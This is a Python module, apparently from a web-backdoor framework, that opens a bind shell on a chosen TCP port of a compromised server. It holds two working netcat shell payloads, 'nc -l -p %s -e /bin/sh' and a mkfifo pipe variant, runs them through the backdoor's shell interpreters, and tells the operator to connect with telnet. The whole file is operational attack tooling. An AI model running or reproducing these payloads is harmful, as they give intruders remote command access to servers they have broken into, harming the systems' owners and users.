'''
Created on 28/ago/2011

@author: norby
'''

'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from threading import Timer
from core.parameters import ParametersList, Parameter as P

classname = 'Tcp'
    
class Tcp(Module):
    """Spawn shell on TCP port"""
    
    vectors = VectorList([
            Vector('shell.sh', 'netcat-traditional', """nc -l -p %s -e /bin/sh"""),
            Vector('shell.sh', 'netcat-bsd', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l %s >/tmp/f""")
            
            ])

    params = ParametersList('Spawn shell on TCP port', vectors,
            P(arg='port', help='Remote path', required=True, type=int, pos=0)
            )

    def __init__( self, modhandler , url, password):

        self.last_vector = None
        self.done = False

        Module.__init__(self, modhandler, url, password)
        
                
    def run_module(self, port):

        t = Timer(5.0, self.__check_module_state)
        t.start()

        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        for vector in vectors:
            
            self.last_vector = vector.name
            self.__execute_payload(vector, [port])

        if t.isAlive():
            t.cancel()
            
        if not self.done:
            self.last_vector = None
            self.mprint("[%s] No backdoor method worked. Assure port is not busy." % (self.name))

                
    def __execute_payload(self, vector, parameters):
        
        payload = self.__prepare_payload(vector, parameters)
        return self.modhandler.load(vector.interpreter).run({ 'cmd' : payload, 'stderr' :  'False'})
        
        
    def __prepare_payload( self, vector, parameters):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
    
    
    def __check_module_state(self):
        if self.last_vector and not self.done:
            self.params.set_and_check_parameters({'vector' : self.last_vector})
            self.mprint('[%s] Port \'%s\' seems open. Use telnet to connect end commands with semicolon' % (self.name, self.last_vector))
            self.done = True
           
    